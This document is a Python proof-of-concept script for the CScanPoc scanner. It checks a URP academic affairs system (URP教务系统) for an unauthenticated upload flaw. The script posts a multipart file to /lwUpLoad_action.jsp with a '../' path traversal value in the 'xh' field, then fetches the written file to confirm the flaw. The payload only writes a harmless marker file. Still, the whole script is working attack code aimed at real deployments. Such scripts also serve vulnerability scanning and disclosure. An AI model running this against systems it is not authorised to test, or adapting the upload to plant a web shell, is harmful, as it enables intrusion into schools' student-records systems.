# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'URP_0006' # 平台漏洞编号，留空
    name = 'URP综合教务系统代码执行漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-05-17'  # 漏洞公布时间
    desc = '''
        URP综合教务系统代码执行漏洞
    ''' # 漏洞描述
    ref = '' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'URP教务系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8c08bfef-71a9-4aa1-b0e3-3ca751be1485'
    author = '国光'  # POC编写者
    create_date = '2018-05-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/lwUpLoad_action.jsp'
            url = '{target}'.format(target=self.target)+payload
            code, head,res, errcode, _ = hh.http(url)
            if code == 404:
                pass         
            else:
                postData = '------WebKitFormBoundaryJXJgj6MiAAHumixA\r\n\
                Content-Disposition: form-data; name=\\"theFile\\"; filename=\\"testvul.txt\\"\r\n\
                Content-Type: text/plain\r\n\r\n\
                testvul\r\n\
                ------WebKitFormBoundaryJXJgj6MiAAHumixA\r\n\
                Content-Disposition: form-data; name=\\"xh\\"\r\n\r\n\
                ../testvul\r\n\
                ------WebKitFormBoundaryJXJgj6MiAAHumixA--\r\n'
                
                userAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36'
                contentType = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJXJgj6MiAAHumixA'
                curlArg = '-H "' +contentType+ '" -d "' +postData+ '" -A "' +userAgent+ '" ' +url
                
                code, head, res, errcode, _ = hh.http(curlArg)

                #验证
                code, head, res, errcode, _ = hh.http('{target}'.format(target=self.target)+'/testvul.txt')
                if code == 200 and "testvul" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
                else:
                    pass
                    
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()